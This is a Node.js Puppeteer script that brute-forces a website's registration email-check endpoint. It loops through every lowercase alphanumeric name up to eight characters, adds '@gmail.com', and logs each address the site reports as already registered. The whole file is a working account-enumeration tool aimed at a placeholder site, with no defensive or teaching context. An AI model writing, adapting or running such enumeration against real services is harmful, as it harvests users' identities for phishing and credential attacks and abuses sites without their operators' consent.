const puppeteer = require('puppeteer');
const symbolsArr = "qwertyuiopasdfghjklzxcvbnm1234567890".split('');

const checkLogin = async (login, page) => {
    const result = JSON.parse(await page.evaluate(async (login) => {
        return await new Promise((resolve, reject) => {
            try {
                const email = `${login}@gmail.com`
                $.post("/check_email/", {value: email, name: "email"}, function (json) {
                    resolve(JSON.stringify({
                        exist: json.messages !== 'ok',
                        email: email
                    }))
                })
            } catch (err) {
                reject(err.toString());
            }
        });
    }, login));
    if (result.exist) {
        console.log(`${result.email}`);
    }
    return result;
}

async function runForAll(page, limit) {
    for (let i = 1; i < limit; i++) {
        var perms = PermutationsWithRepetition(symbolsArr, i);
        while (j = perms.next()) {
            const login = j.join("")
            const result = await checkLogin(login, page)
        }
    }
}

(async () => {
    const browser = await puppeteer.launch({headless: true});
    const page = await browser.newPage();
    await page.goto('https://blabla.site/register/');

    await runForAll(page, 9);
    await browser.close();
})();

function PermutationsWithRepetition(src, len) {

    var K = len - 1, k = 0,
        N = src.length, n = 0,
        out = [],
        stack = [];

    function next() {
        while (true) {
            while (n < src.length) {
                out[k] = src[n++];
                if (k == K) return out.slice(0);
                else {
                    if (n < src.length) {
                        stack.push(k);
                        stack.push(n);
                    }
                    k++;
                    n = 0;
                }
            }
            if (stack.length == 0) break;

            n = stack.pop();
            k = stack.pop();
        }
        return false;
    }

    function rewind() {
        k = 0;
        n = 0;
        out = [];
        stack = [];
    }

    function each(cb) {
        rewind();
        var v;
        while (v = next()) if (cb(v) === false) return;
    }

    return {
        next: next,
        each: each,
        rewind: rewind
    };
}